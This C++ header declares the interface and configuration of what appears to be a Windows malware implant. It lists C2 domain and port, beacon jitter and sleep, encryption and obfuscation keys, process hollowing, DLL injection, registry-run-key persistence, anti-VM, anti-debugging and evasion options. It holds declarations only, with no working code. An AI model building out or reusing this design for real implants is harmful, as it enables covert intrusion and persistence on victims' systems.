#ifndef AGENT_H
#define AGENT_H

#include <Windows.h>
#include <string>
#include <vector>
#include <memory>

// Enumerations
enum class AgentFeature {
    NETWORK,
    PROCESS_HOLLOWING,
    DLL_INJECTION,
    PERSISTENCE,
    EVASION,
    ANTI_VM,
    ANTI_DEBUGGING
};

// Configuration
struct AgentConfig {
    std::string protocol;
    std::string domain;
    int port;
    std::string logLevel;
    std::string logFile;
    size_t logSize;
    std::string encryptionKey;
    std::string encryptionIV;
    int encryptionMethod;
    int obfuscationLevel;
    std::string obfuscationKey;
    bool antiDebugging;
    int antiDebuggingMethod;
    bool processHollowing;
    std::string processHollowingExe;
    bool dllInjection;
    std::string dllInjectionDll;
    std::string networkInterface;
    int networkPort;
    bool jittering;
    int jitteringInterval;
    int jitteringVariance;
    bool sleep;
    int sleepInterval;
    int sleepVariance;
    bool persistence;
    std::string persistenceRegKey;
    std::string persistenceRegValue;
    bool evasion;
    int evasionMethod;
};

// Agent interface
class Agent {
public:
    virtual ~Agent() = default;
    virtual void init() = 0;
    virtual void handleNetworkRequests() = 0;
    virtual void handleProcessHollowingRequests() = 0;
    virtual void handleDLLInjectionRequests() = 0;
    virtual void handlePersistenceRequests() = 0;
    virtual void handleEvasionRequests() = 0;
};

// Agent factory
std::unique_ptr<Agent> createAgent(AgentConfig config);

#endif // AGENT_H